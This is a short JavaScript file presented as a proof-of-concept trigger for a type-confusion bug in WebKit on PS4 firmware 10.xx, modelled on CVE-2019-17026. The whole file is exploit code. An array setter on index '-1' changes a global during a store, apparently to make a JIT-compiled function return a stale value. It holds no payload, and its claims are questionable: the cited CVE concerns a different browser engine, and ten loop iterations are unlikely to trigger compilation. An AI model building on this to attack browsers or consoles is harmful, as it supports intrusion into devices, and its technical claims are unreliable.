// POC for CVE-2019-17026-like Type Confusion in WebKit on PS4 10.xx
const NUM_ITERATIONS = 10;
const ARRAY_LENGTH = 100;

let OBJ = { a: 41 };
OBJ.a = 42; // Avoid constant optimization

function f(obj, idx) {
    let v = OBJ.a;
    obj[idx] = v;
    return OBJ.a;
}

function main() {
    for (let i = 0; i < NUM_ITERATIONS; i++) {
        let isLastIteration = i === NUM_ITERATIONS - 1;
        let idx = isLastIteration ? -1 : ARRAY_LENGTH;

        let obj = new Array(ARRAY_LENGTH);
        Object.defineProperty(obj, '-1', {
            set() {
                alert('Setter triggered, changing OBJ.a to 1337');
                OBJ.a = 1337;
            }
        });

        for (let j = 0; j < ARRAY_LENGTH; j++) {
            if (j === ARRAY_LENGTH / 2) continue; // Avoid packed array
            obj[j] = j;
        }

        let r = f(obj, idx);
        alert('Iteration ' + i + ': Result = ' + r);
    }
    alert('Final OBJ.a = ' + OBJ.a); // Should be 1337
}

main();